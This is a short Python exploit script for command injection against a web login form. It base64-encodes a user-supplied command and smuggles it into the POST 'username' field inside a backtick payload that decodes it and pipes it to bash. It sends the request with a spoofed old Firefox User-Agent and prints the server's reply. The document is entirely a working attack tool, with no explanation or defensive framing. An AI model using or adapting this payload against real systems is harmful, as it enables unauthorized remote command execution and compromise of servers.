#!/usr/bin/python3

import base64
import urllib.request
import sys


if len(sys.argv) < 2:
	print(f"Usage: {sys.argv[0]} <TARGET URL> <CMD>")
	sys.exit()

target = sys.argv[1]
cmd = sys.argv[2].encode('utf-8')
b64cmd = base64.b64encode(cmd)

req = urllib.request.Request(target, 
			     data=b'username=;`echo+"%s"+|+base64+-d+|+bash;#`' % b64cmd,
			     headers={"User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
				      "Content-Type": "application/x-www-form-urlencoded",})

with urllib.request.urlopen(req) as f:
	print(f.read())
